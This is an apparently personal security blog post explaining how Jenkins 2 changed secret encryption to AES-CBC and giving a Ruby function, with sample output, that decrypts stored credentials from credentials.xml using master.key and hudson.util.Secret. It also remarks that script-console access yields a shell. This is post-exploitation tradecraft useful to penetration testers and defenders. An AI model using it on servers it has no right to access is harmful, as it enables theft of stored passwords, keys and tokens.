+++
title = "Decrypting Jenkins 2 Credentials"
draft = false
date = "2017-06-21T23:07:11-07:00"

+++

![jenkins](/img/jenkins.png#floatright)
I like Jenkins. It's a good orchestration tool and provides remote code execution as a service.

If your user permissions give you access to the script console `/script` it's trivial to obtain a shell. The developers explicitly call this out in their [documentation](https://wiki.jenkins-ci.org/display/JENKINS/Jenkins+Script+Console) as well so it's a feature, not a bug.  Of course if you can create a job you can run shell commands as well, but I'll leave that for another time.

I've often seen privileged credentials stored here - from developer SSO credentials to service accounts to AWS keys and secrets. Given file system access or backup files with the key material, the encrypted secrets can easily be decrypted. This is pretty common knowledge and a really good write up on decrypting Jenkins credentials is at [thiébaud.fr](http://xn--thibaud-dya.fr/jenkins_credentials.html) along with a simple python decrypt [script](https://github.com/tweksteen/jenkins-decrypt/blob/master/decrypt.py).

But there was a recent change to how Jenkins strings are encrypted and the existing decrypt scripts no longer work on Jenkins 2 as of about Jenkins version 2.44 which was released around February 1, 2017. This change was due to the following security advisory [SECURITY-304](https://jenkins.io/security/advisory/2017-02-01/) and CVE-2017-2598.

>**Use of AES ECB block cipher mode without IV for encrypting secrets**

>Secrets such as passwords are typically stored on disk and sent to users as part of some pages in encrypted form. These were encrypted using AES-128 ECB without IV, which exposes Jenkins and the stored secrets to unnecessary risks. Jenkins now encrypts secrets using AES-128 CBC with random IV.

The relevant pull request with changes on Github is [here](https://github.com/jenkinsci/jenkins/commit/e6aa166246d1734f4798a9e31f78842f4c85c28b). We see that the [old encryption function](https://github.com/jenkinsci/jenkins/blob/e6aa166246d1734f4798a9e31f78842f4c85c28b/core/src/main/java/hudson/util/HistoricalSecrets.java) has been pulled out into HistoricalSecrets.  Let's look at the [new encryption function](https://github.com/jenkinsci/jenkins/blob/e6aa166246d1734f4798a9e31f78842f4c85c28b/core/src/main/java/hudson/util/Secret.java#L118). It now uses CBC instead of ECB and utilizes an IV. The master secret encryption method didn't look to change, but the secrets encryption and decryption methods did.

![diff](/img/jdiff.png)

I'm partial to Ruby and fortunately we can modify some previous work done by Github user *juyeong* who wrote a [decrypt script](https://gist.github.com/juyeong/081379bd1ddb3754ed51ab8b8e535f7c) in Ruby for the original Jenkins encryption method. If we copy paste the new decrypt function's byte shifting code into that Ruby script we see that it can be used with just a bit of modification. After some slight massaging to get the ciphers working with Ruby, and extracting the IV and encrypted secret I landed on the below. We still use the original ECB decryption function to obtain the decryption key from the `master.key` and `hudson.util.Secret` files. We then leverage that key to decrypt the encrypted secrets.

<pre><code class="ruby">
	def try_decrypt(encrypted,key)
	  encrypted_text = Base64.decode64(encrypted).bytes

	  iv_length = ((encrypted_text[1] & 0xff) << 24) | ((encrypted_text[2] & 0xff) << 16) | ((encrypted_text[3] & 0xff) << 8) | (encrypted_text[4] & 0xff)
	  
	  data_length = ((encrypted_text[5] & 0xff) << 24) | ((encrypted_text[6] & 0xff) << 16) | ((encrypted_text[7] & 0xff) << 8) | (encrypted_text[8] & 0xff)
	  
	  if encrypted_text.length != (1 + 8 + iv_length + data_length)
	      abort 'invalid encrypted string'
	  end
	  iv = encrypted_text[9..(9 + iv_length)].pack('C*')
	  code = encrypted_text[(9 + iv_length)..encrypted_text.length].pack('C*')

	  cipher = OpenSSL::Cipher.new('AES-128-CBC')
	  cipher.decrypt
	  cipher.key = key
	  cipher.iv = iv

	  text = cipher.update(code) + cipher.final
	  if text.length == 32 #Guessing API token
	    text = Digest::MD5.new.update(text).hexdigest
	  end
	  text
</code></pre>

So given the `master.secret`, the `hudson.util.Secret`, and an encrypted string (within `credentials.xml` in this case), we can pass those files to the updated script and obtain the plaintext secrets.

<pre><code class="nohighlight">
-&gt; % <b>cat credentials.xml</b>
&lt;?xml version='1.0' encoding='UTF-8'?&gt;
&lt;com.cloudbees.plugins.credentials.SystemCredentialsProvider plugin="credentials@2.1.14"&gt;
  &lt;domainCredentialsMap class="hudson.util.CopyOnWriteMap$Hash"&gt;
    &lt;entry&gt;
      &lt;com.cloudbees.plugins.credentials.domains.Domain&gt;
        &lt;specifications/&gt;
      &lt;/com.cloudbees.plugins.credentials.domains.Domain&gt;
      &lt;java.util.concurrent.CopyOnWriteArrayList&gt;
        &lt;com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl&gt;
          &lt;scope&gt;GLOBAL&lt;/scope&gt;
          &lt;id&gt;2de25363-96dc-495b-b258-1ccb3366f5a6&lt;/id&gt;
          &lt;description&gt;&lt;/description&gt;
          <b>&lt;username&gt;testuser&lt;/username&gt;</b>
          <b>&lt;password&gt;{AQAAABAAAAAQd42B1h85u14cpl37q0qSekGHvTLrKx0+veCjouoYTGs=}&lt;/password&gt;</b>
        &lt;/com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl&gt;
      &lt;/java.util.concurrent.CopyOnWriteArrayList&gt;
    &lt;/entry&gt;
  &lt;/domainCredentialsMap&gt;
&lt;/com.cloudbees.plugins.credentials.SystemCredentialsProvider&gt;%              

-&gt; % <b>ruby decrypt_jenkins2.rb master.key hudson.util.Secret credentials.xml
testuser:Password123</b>
</code></pre>


The full Jenkins 2 decrypt script is up on Github: https://gist.github.com/thesubtlety/e7d26891227f0b68b9d5db1ea9870c62
